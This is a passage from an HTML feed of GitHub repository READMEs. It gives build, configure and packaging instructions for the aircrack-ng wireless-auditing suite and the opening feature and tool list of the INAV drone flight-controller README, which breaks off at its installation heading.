&lt;h3&gt;&lt;a id="user-content-configure-flags" class="anchor" aria-hidden="true" href="#configure-flags"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;code&gt;./configure&lt;/code&gt; flags&lt;/h3&gt;
&lt;p&gt;When configuring, the following flags can be used and combined to adjust the suite
to your choosing:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;with-airpcap=DIR&lt;/strong&gt;:  needed for supporting airpcap devices on windows (cygwin or msys2 only)
Replace DIR above with the absolute location to the root of the
extracted source code from the Airpcap CD or downloaded SDK available
online. Required on Windows to build &lt;code&gt;besside-ng&lt;/code&gt;, &lt;code&gt;besside-ng-crawler&lt;/code&gt;,
&lt;code&gt;easside-ng&lt;/code&gt;, &lt;code&gt;tkiptun-ng&lt;/code&gt; and &lt;code&gt;wesside-ng&lt;/code&gt; when building experimental tools.
The developer pack (Compatible with version 4.1.1 and 4.1.3) can be downloaded at
&lt;a href="https://support.riverbed.com/content/support/software/steelcentral-npm/airpcap.html" rel="nofollow"&gt;https://support.riverbed.com/content/support/software/steelcentral-npm/airpcap.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;with-experimental&lt;/strong&gt;: needed to compile &lt;code&gt;tkiptun-ng&lt;/code&gt;, &lt;code&gt;easside-ng&lt;/code&gt;, &lt;code&gt;buddy-ng&lt;/code&gt;,
&lt;code&gt;buddy-ng-crawler&lt;/code&gt;, &lt;code&gt;airventriloquist&lt;/code&gt; and &lt;code&gt;wesside-ng&lt;/code&gt;.
libpcap development package is also required to compile most of the tools.
If not present, not all experimental tools will be built.
On Cygwin, libpcap is not present and the Airpcap SDK replaces it.
See --with-airpcap option above.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;with-ext-scripts&lt;/strong&gt;: needed to build &lt;code&gt;airoscript-ng&lt;/code&gt;, &lt;code&gt;versuck-ng&lt;/code&gt;, &lt;code&gt;airgraph-ng&lt;/code&gt; and
&lt;code&gt;airdrop-ng&lt;/code&gt;.
Note: Each script has its own dependencies.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;with-gcrypt&lt;/strong&gt;:   Use libgcrypt crypto library instead of the default OpenSSL.
And also use internal fast sha1 implementation (borrowed from GIT)
Dependency (Debian): libgcrypt20-dev&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;with-duma&lt;/strong&gt;:	Compile with DUMA support. DUMA is a library to detect buffer overruns and under-runs.
Dependencies (debian): duma&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;disable-libnl&lt;/strong&gt;:  Set-up the project to be compiled without libnl (1 or 3). Linux option only.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;without-opt&lt;/strong&gt;:  Do not enable stack protector (on GCC 4.9 and above).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;enable-shared&lt;/strong&gt;:   Make OSdep a shared library.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;disable-shared&lt;/strong&gt;: When combined with &lt;strong&gt;enable-static&lt;/strong&gt;, it will statically compile Aircrack-ng.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;with-avx512&lt;/strong&gt;:  On x86, add support for AVX512 instructions in aircrack-ng. Only use it when
the current CPU supports AVX512.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;with-static-simd=&lt;/strong&gt;: Compile a single optimization in aircrack-ng binary. Useful when compiling
statically and/or for space-constrained devices. Valid SIMD options: x86-sse2,
x86-avx, x86-avx2, x86-avx512, ppc-altivec, ppc-power8, arm-neon, arm-asimd.
Must be used with --enable-static --disable-shared. When using those 2 options, the default
is to compile the generic optimization in the binary. --with-static-simd merely allows
to choose another one.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-examples" class="anchor" aria-hidden="true" href="#examples"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Examples:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Configure and compiling:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./configure --with-experimental
make
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compiling with gcrypt:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./configure --with-gcrypt
make
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Installing:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;make install&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Installing (strip binaries):&lt;/p&gt;
&lt;p&gt;&lt;code&gt;make install-strip&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Installing, with external scripts:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./configure --with-experimental --with-ext-scripts
make
make install
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Testing (with sqlite, experimental and pcre)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./configure --with-experimental
make
make check
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compiling on OS X with macports (and all options):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./configure --with-experimental
gmake
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compiling on OS X 10.10 with XCode 7.1 and Homebrew:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;env CC=gcc-4.9 CXX=g++-4.9 ./configure
make
make check
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;NOTE&lt;/em&gt;: Older XCode ships with a version of LLVM that does not support CPU feature
detection; which causes the &lt;code&gt;./configure&lt;/code&gt; to fail. To work around this older LLVM,
it is required that a different compile suite is used, such as GCC or a newer LLVM
from Homebrew.&lt;/p&gt;
&lt;p&gt;If you wish to use OpenSSL from Homebrew, you may need to specify the location
to its' installation. To figure out where OpenSSL lives, run:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;brew --prefix openssl&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Use the output above as the DIR for &lt;code&gt;--with-openssl=DIR&lt;/code&gt; in the &lt;code&gt;./configure&lt;/code&gt; line:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;env CC=gcc-4.9 CXX=g++-4.9 ./configure --with-openssl=DIR
make
make check
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compiling on FreeBSD with gcc9&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;env CC=gcc9 CXX=g++9 MAKE=gmake ./configure
gmake
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compiling on Cygwin with Airpcap (assuming Airpcap devpack is unpacked in Aircrack-ng directory)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cp -vfp Airpcap_Devpack/bin/x86/airpcap.dll src
cp -vfp Airpcap_Devpack/bin/x86/airpcap.dll src/aircrack-osdep
cp -vfp Airpcap_Devpack/bin/x86/airpcap.dll src/aircrack-crypto
cp -vfp Airpcap_Devpack/bin/x86/airpcap.dll src/aircrack-util
dlltool -D Airpcap_Devpack/bin/x86/airpcap.dll -d build/airpcap.dll.def -l Airpcap_Devpack/bin/x86/libairpcap.dll.a
autoreconf -i
./configure --with-experimental --with-airpcap=$(pwd)
make
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compiling on DragonflyBSD with gcrypt using GCC 8&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;autoreconf -i
env CC=gcc8 CXX=g++8 MAKE=gmake ./configure --with-experimental --with-gcrypt
gmake
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compiling on OpenBSD (with autoconf 2.69 and automake 1.16)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;export AUTOCONF_VERSION=2.69
export AUTOMAKE_VERSION=1.16
autoreconf -i
env MAKE=gmake ./configure
gmake
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compiling and debugging aircrack-ng&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;export CFLAGS='-O0 -g'
export CXXFLAGS='-O0 -g'
./configure    
make
LD_LIBRARY_PATH=.libs gdb --args ./aircrack-ng [PARAMETERS]
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a id="user-content-packaging" class="anchor" aria-hidden="true" href="#packaging"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Packaging&lt;/h1&gt;
&lt;p&gt;Automatic detection of CPU optimization is done at run time. This behavior
&lt;strong&gt;is&lt;/strong&gt; desirable when packaging Aircrack-ng (for a Linux or other distribution.)&lt;/p&gt;
&lt;p&gt;Also, in some cases it may be desired to provide your own flags completely and
not having the suite auto-detect a number of optimizations. To do this, add
the additional flag &lt;code&gt;--without-opt&lt;/code&gt; to the &lt;code&gt;./configure&lt;/code&gt; line:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./configure --without-opt&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-using-precompiled-binaries" class="anchor" aria-hidden="true" href="#using-precompiled-binaries"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Using precompiled binaries&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-linuxbsd" class="anchor" aria-hidden="true" href="#linuxbsd"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux/BSD&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Use your package manager to download aircrack-ng&lt;/li&gt;
&lt;li&gt;In most cases, they have an old version.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-windows-1" class="anchor" aria-hidden="true" href="#windows-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Windows&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Install the appropriate "monitor" driver for your card (standard drivers doesn't work for capturing data).&lt;/li&gt;
&lt;li&gt;aircrack-ng suite is command line tools. So, you have to open a commandline
&lt;code&gt;Start menu -&amp;gt; Run... -&amp;gt; cmd.exe&lt;/code&gt; then use them&lt;/li&gt;
&lt;li&gt;Run the executables without any parameters to have help&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a id="user-content-documentation" class="anchor" aria-hidden="true" href="#documentation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Documentation&lt;/h1&gt;
&lt;p&gt;Documentation, tutorials, ... can be found on &lt;a href="https://aircrack-ng.org" rel="nofollow"&gt;https://aircrack-ng.org&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;See also manpages and the forum.&lt;/p&gt;
&lt;p&gt;For further information check the &lt;a href="README"&gt;README&lt;/a&gt; file&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-infrastructure-sponsors" class="anchor" aria-hidden="true" href="#infrastructure-sponsors"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Infrastructure sponsors&lt;/h1&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/8b918105604d372750590d52c7a46e66c0f9b20f/68747470733a2f2f75706c6f6164732d73736c2e776562666c6f772e636f6d2f3561633363303436633832373234393730666336303931382f3563303139643931376262613331326166373535336234395f4d61635374616469756d2d646576656c6f7065726c6f676f2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/8b918105604d372750590d52c7a46e66c0f9b20f/68747470733a2f2f75706c6f6164732d73736c2e776562666c6f772e636f6d2f3561633363303436633832373234393730666336303931382f3563303139643931376262613331326166373535336234395f4d61635374616469756d2d646576656c6f7065726c6f676f2e706e67" alt="MacStadium" width="150" height="61" data-canonical-src="https://uploads-ssl.webflow.com/5ac3c046c82724970fc60918/5c019d917bba312af7553b49_MacStadium-developerlogo.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>aircrack-ng</author><guid isPermaLink="false">https://github.com/aircrack-ng/aircrack-ng</guid><pubDate>Tue, 04 Feb 2020 00:21:00 GMT</pubDate></item><item><title>iNavFlight/inav #22 in C, This week</title><link>https://github.com/iNavFlight/inav</link><description>&lt;p&gt;&lt;i&gt;INAV: Navigation-enabled flight control software&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-inav---navigation-capable-flight-controller" class="anchor" aria-hidden="true" href="#inav---navigation-capable-flight-controller"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;INAV - navigation capable flight controller&lt;/h1&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/166908bf3fef570f98492184c9bcbf72f96135fb/687474703a2f2f7374617469632e726367726f7570732e6e65742f666f72756d732f6174746163686d656e74732f362f312f302f332f372f362f61393038383835382d3130322d696e61762e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/166908bf3fef570f98492184c9bcbf72f96135fb/687474703a2f2f7374617469632e726367726f7570732e6e65742f666f72756d732f6174746163686d656e74732f362f312f302f332f372f362f61393038383835382d3130322d696e61762e706e67" alt="INAV" data-canonical-src="http://static.rcgroups.net/forums/attachments/6/1/0/3/7/6/a9088858-102-inav.png" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/4a6cd9684c2980f177c4a5ff8131e22476c525fb/68747470733a2f2f7472617669732d63692e6f72672f694e6176466c696768742f696e61762e7376673f6272616e63683d6d6173746572"&gt;&lt;img src="https://camo.githubusercontent.com/4a6cd9684c2980f177c4a5ff8131e22476c525fb/68747470733a2f2f7472617669732d63692e6f72672f694e6176466c696768742f696e61762e7376673f6272616e63683d6d6173746572" alt="Travis CI status" data-canonical-src="https://travis-ci.org/iNavFlight/inav.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-features" class="anchor" aria-hidden="true" href="#features"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Features&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Outstanding navigation performance out of the box&lt;/li&gt;
&lt;li&gt;Position Hold, Altitude Hold, Return To Home and Missions&lt;/li&gt;
&lt;li&gt;Excellent support for fixed wing UAVs: airplanes, flying wings&lt;/li&gt;
&lt;li&gt;Pitot tube support&lt;/li&gt;
&lt;li&gt;Rangefinder support (sonar and laser)&lt;/li&gt;
&lt;li&gt;Oneshot and Multishot ESC support.&lt;/li&gt;
&lt;li&gt;Blackbox flight recorder logging (to onboard flash or external SD card).&lt;/li&gt;
&lt;li&gt;Lux's new PID (uses float values internally, resistant to looptime variation).&lt;/li&gt;
&lt;li&gt;Simultaneous Bluetooth configuration and OSD.&lt;/li&gt;
&lt;li&gt;LTM Telemetry.&lt;/li&gt;
&lt;li&gt;Smartport Telemetry.&lt;/li&gt;
&lt;li&gt;RSSI via ADC - Uses ADC to read PWM RSSI signals, tested with FrSky D4R-II and X8R.&lt;/li&gt;
&lt;li&gt;OLED Displays - Display information on: Battery voltage, profile, rate profile, version, sensors, RC, etc.&lt;/li&gt;
&lt;li&gt;In-flight manual PID tuning and rate adjustment.&lt;/li&gt;
&lt;li&gt;Rate profiles and in-flight selection of them.&lt;/li&gt;
&lt;li&gt;Multiple simultaneous telemetry providers.&lt;/li&gt;
&lt;li&gt;Configurable serial ports for Serial RX, Telemetry, MSP, GPS - Use most devices on any port, softserial too.&lt;/li&gt;
&lt;li&gt;Multi-color RGB LED Strip support (each LED can be a different color using variable length WS2811 Addressable RGB strips - use for Orientation Indicators, Low Battery Warning, Flight Mode Status, etc)&lt;/li&gt;
&lt;li&gt;PIDs from CF/BF can be used in INAV, no need to retune for INAV&lt;/li&gt;
&lt;li&gt;And many more!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For a list of features, changes and some discussion please review consult the releases &lt;a href="https://github.com/iNavFlight/inav/releases"&gt;page&lt;/a&gt; and the documentation.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-tools" class="anchor" aria-hidden="true" href="#tools"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Tools&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-inav-configurator" class="anchor" aria-hidden="true" href="#inav-configurator"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;INAV Configurator&lt;/h3&gt;
&lt;p&gt;Official tool for INAV can be downloaded &lt;a href="https://github.com/iNavFlight/inav-configurator/releases"&gt;here&lt;/a&gt;. It can be run on Windows, MacOS and Linux machines and standalone application.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-inav-blackbox-explorer" class="anchor" aria-hidden="true" href="#inav-blackbox-explorer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;INAV Blackbox Explorer&lt;/h3&gt;
&lt;p&gt;Tool for Blackbox logs analysis is available &lt;a href="https://github.com/iNavFlight/blackbox-log-viewer/releases"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-telemetry-screen-for-opentx" class="anchor" aria-hidden="true" href="#telemetry-screen-for-opentx"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Telemetry screen for OpenTX&lt;/h3&gt;
&lt;p&gt;Users of FrSky Taranis X9 and Q X7 can use INAV Lua Telemetry screen created by @teckel12 . Software and installation instruction are available here: &lt;a href="https://github.com/iNavFlight/LuaTelemetry"&gt;https://github.com/iNavFlight/LuaTelemetry&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-installation" class="anchor" aria-hidden="true" href="#installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation&lt;/h2&gt;
